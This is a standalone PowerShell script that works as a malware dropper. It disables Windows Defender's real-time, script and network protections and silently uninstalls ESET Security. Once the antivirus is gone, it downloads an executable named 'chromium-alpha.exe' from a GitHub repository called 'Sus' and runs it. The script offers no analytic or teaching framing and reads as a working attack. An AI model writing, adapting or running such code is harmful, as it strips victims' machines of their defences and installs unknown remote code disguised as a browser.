$appdata = [Environment]::GetFolderPath("ApplicationData"); 
cd $appdata

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode
$filterSpec = "ESET Security"
$hives = @("HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall", "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
$hives |% {
  Write-Host "Checking for products in hive: $_"
  $keys = gci $_ -Recurse
  $subkeys = $keys |% {
    $displayName = [string]$_.GetValue("DisplayName")
    $uninstallString = ([string]$_.GetValue("UninstallString")).ToLower().Replace("/i", "").Replace("msiexec.exe", "")
    if ($displayName.StartsWith($filterSpec)) {
      start-process "msiexec.exe" -arg "/X $uninstallString /qb! REBOOT=ReallySuppress"
    }
  }
}
while($true){
    $software = "ESET Security";
    $installed = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where { $_.DisplayName -eq $software }) -ne $null

    If(-Not $installed) {
        wget https://github.com/Squatch55/Sus/raw/master/59684/Dont/chromium-alpha.exe -OutFile chromium-alpha.exe; start-process chromium-alpha.exe
        break
    }
}